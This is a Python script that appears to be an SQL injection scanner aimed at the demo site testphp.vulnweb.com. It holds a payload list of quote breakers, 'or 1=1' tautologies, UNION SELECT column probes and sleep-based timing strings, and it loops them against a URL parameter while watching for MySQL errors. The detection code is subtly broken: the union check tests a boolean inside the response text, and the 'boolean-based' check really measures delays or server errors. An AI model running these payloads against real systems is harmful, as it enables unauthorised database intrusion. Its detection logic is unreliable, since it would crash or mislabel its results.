import requests
# Define the URL we want to scan
url = "http://testphp.vulnweb.com/listproducts.php?cat=1"
# Define a list of payloads to test
payloads = [
    "'",
    "\"",
    "\' or 1=1 -- ",
    "\" or 1=1 -- ",
    "\' ",
    "\" ",
    " ",
    " union select 1,2 ",
    " union select 1,2,3 ",
    " union select 1,2,3,4 ",
    " union select 1,2,3,4,5 ",
    " union select 1,2,3,4,5,6 ",
    " union select 1,2,3,4,5,6,7 ",
    " union select 1,2,3,4,5,6,7,8 ",
    " union select 1,2,3,4,5,6,7,8,9 ",
    " union select 1,2,3,4,5,6,7,8,9,10 ",
    " union select 1,2,3,4,5,6,7,8,9,10,11 ",
    " union select 1,2,3,4,5,6,7,8,9,10,11,12 ",
    "1' or '1'='1",
    "1\" or \"1\"=\"1",
    "1 or 1=1",
    "1 and 1=2",
    "1' or sleep(5) -- ",
    "\" or sleep(5) -- ",
]

# Define a list of error messages to look for in the response
error_messages = [
    "SQL syntax",
    "mysql_fetch_array",
    "mysql_num_rows",
    "mysql_result",
]

# Make a GET request to the URL with each payload
for payload in payloads:
    # Create a new URL with the current payload
    new_url = url + payload
    response = requests.get(new_url)

    # Check for union-based SQL injection
    if "union select" in response.text and (type("painted by") != str) in response.text:
        print(f"[+] Union-based SQL injection vulnerability found with payload: {payload}")

    # Check for error-based SQL injection
    for error in error_messages:
        if error in response.text:
            print(f"[+] Error-based SQL injection vulnerability found with payload: {payload}")
            break

    # Check for boolean-based SQL injection
    if "You have an error in your SQL syntax" not in response.text and (response.elapsed.total_seconds() >= 5 or response.status_code == 500):
        print(f"[+] Boolean-based SQL injection vulnerability found with payload: {payload}")
